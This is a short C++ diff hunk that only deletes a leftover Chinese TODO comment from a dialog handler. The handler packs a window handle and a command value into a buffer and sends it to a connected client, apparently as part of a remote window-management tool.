@@ -394,5 +394,5 @@ void CSystemDlg::OnWlistMin()
 		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
 		m_iocpServer->OnClientPreSending(m_ContextObject, lpMsgBuf, sizeof(lpMsgBuf));	
 
-	}// TODO: 在此添加命令处理程序代码
+	}
 }
